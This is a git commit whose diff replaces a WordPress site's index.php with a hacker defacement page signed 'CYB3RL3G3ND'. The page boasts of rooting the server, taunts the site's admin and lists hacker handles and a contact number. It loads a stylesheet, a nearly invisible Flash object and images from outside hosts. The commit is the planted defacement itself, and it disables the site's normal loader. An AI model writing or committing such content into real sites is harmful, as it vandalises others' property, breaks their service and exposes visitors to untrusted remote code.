17be195c6cd37c326a787f0d883afaedd24a19d4
hacker3 <hhhhh@yahoo.com>
2014-01-04 01:26:38 +0000

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,41 @@
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+<link type="image/x-icon" href="http://nisha4you.wen.su/favi/wwe.gif" rel="shortcut icon" />
+<link rel="stylesheet" type="text/css" href="http://9jabaze.com/styles.css" media="all,handheld"/>
+<html><head><meta http-equiv="content-type" content="text/html; 
+charset=ISO-8859-1"><title>Hacked By CYB3RL3G3ND</title> 
+</head><body bgcolor="black"><p></p><style>BODY {PADDING-RIGHT: 5px; 
+ <embed src="http://yabanci-tbh.persiangig.com/other/50256-h4ck3d%281%29.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" width="1" height="4" quality="High"></object>PADDING-LEFT: 5px; SCROLLBAR-FACE-COLOR: #000000; BACKGROUND: #000000; 
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define('WP_USE_THEMES', true);
+PADDING-BOTTOM: 5px; MARGIN: 0px; SCROLLBAR-HIGHLIGHT-COLOR: #000000; 
 
-/** Loads the WordPress Environment and Template */
-require('./wp-blog-header.php');
-?>
+SCROLLBAR-SHADOW-COLOR: #00c000; SCROLLBAR-3DLIGHT-COLOR: #00c000; 
+
+SCROLLBAR-ARROW-COLOR: #00c000; PADDING-TOP: 5px; SCROLLBAR-TRACK-COLOR: #000000; 
+
+SCROLLBAR-DARKSHADOW-COLOR: #111111}</style><br><center><br> <br> <br> <br><hr><p align="center"><font face="Baskerville Old Face" size="5" color="white"><b>!! <font color="red">CYB3RL3G3ND</font> <font color="blue">JUST</font> <font color="green">LEFT</font> !!</b></font></p><hr>
+<div class="great"><hr><font color="magenta"><b>THIS IS NOT A DREAM</b> <img src="http://djvc.9jafolder.tk/img/400627082_3a0dbffb79.gif"/></font><div><hr>
+<div class="center"><hr><div style="font-family: Bookman Old Style;color: red;margin:0;text-shadow: 0 1px 3px red, -1px 0 3px red, 0 -1px 3px #00FF00, 1px 0 3px red;"><big size="50">
+<center><p align="center"><font face="Baskerville Old Face" size="5" color="#FF0000">YOU HAVE BEEN <img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcTyf1WtY9_ty75_Bph9DzgpTIrDHo4nadz-0c_W6oZTtR8xYLAJ"/> BY CYB3RL3G3ND</font></p><hr></div>
+</h1>
+</i>
+<p></p>
+<p></p>
+<p><font face="Bold Italic Art" size="5"><br>
+</font></p></div>
+<img src="http://zeroclan.wapka.mobi/img/4941/4941777_f8a1584593.png"/><img src="http://f16.wapkafiles.com/download/f/f/5/2356540_ff518381ca7ac29c045bf438.jpg/611439c77cc498dc6a85/1470045_177492015791192_1231413677_n.jpg"/><img src="http://zeroclan.wapka.mobi/img/4941/4941777_f8a1584593.png"/>
+<hr><p align="center"><font face="Baskerville Old Face" size="5" color="pink"><b>0OPPS SERVER SECURITY FUCK3D-UP</b></font></p><hr><font color="red"><b>SERVER 0OPRO0TED IN 0.02sk</b></font><hr>
+<div class="error"><big size"10">I DIDNOT COME HERE TO WRECK YOUR H4RD WORK,I WAS H3R3 TO GIVE YOU A MESSAG3</div>
+<div class="latest"><center>AH WAS LAUGHING WHILE U WERE BR4GGIN,YOUR SITE SECURITY KIND4 SUCK5,@4DMIN Y DO U WASTE YOUR TYM CR34TING WH4T YOU CANT PROT3CT</center></div>
+<hr>WHEN WE WRECK A GODDAMN RULE<hr>
+<hr><font color="red">»</font>WE DONT REGRET</font>
+<font color="red">»</font>WE DONT EDIT</font><hr>
+<font color="red">»</font>WE DONT QUIT</font><hr><hr><img src="http://wapkaimage.com/1197/1197710_7a68f95d16.jpg"/><div class="header2">I HEARD #HACKING HAS NO RULE #LWKMD</div><hr>
+<hr>ANONYMOUS CYBERZ WE ARE HARML3SS<hr>
+<div class="great">DIS SHOULD S3RV3 AS A W4RNIN TO U BR4GGERS,CUZ BR4GGING R3ALLY KILLS<hr>
+<hr><small>AM NOT A GOOD H4CK3R,BUH CREATIVITY SPEAKS,
+<span class="left">THE H4RD3R U TRY,THE HIGH3R W3 GROW</div><hr>
+THINKING ABOUT STRIKIN BACK,TRY AND WILL NEVER SUCCEED</div>
+<center><div class="header">NEED HELP CONTACT US @ <font color="red">08137286767</font> OR <a href="http://www.legenzloaded.tk">HERE</a> @ <img src="http://djvc.9jafolder.tk/img/400627059_c0f72a58f6.png"/> <dont color="cyan">CYB3RL3G3ND</font></div></center>
+<hr><center><marquee>MA SINCERE THANKS GO TO MA BOSS <img src="http://djvc.9jafolder.tk/img/400627094_bc619e3c14.gif"/><big size="10"><a href="http://www.jboydjvc.tk">JBO<font color="red">Y</font>DJVC</a></big></center></marquee><hr>
+<div class="great">Shout Out To You And Ma Palz::====></div>
+<div class="great"><font color="cornflowerblue">SWAGSE,WAPKING,SAMBOYK,SAMTEL,DANNYRAZZY,CYBERDESTROYER,3EGA,NISCHAL,MOMOH,5UP3RKIN9.HACKLORD,D_3RROR AND OTHERS.....</font></div><br/><div class="center"></font><img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcSawW3M9yiViYBa3ilnIFBf9EETU611PLyzXwlRH-ItKQkHT7wDog"/></div>
+<hr><font color="khaki">Still Your Boy </font><big size="15">#[CyBeRLeG3nD] ==><font color="khaki">Log0ut...!!99% :p<font><hr>
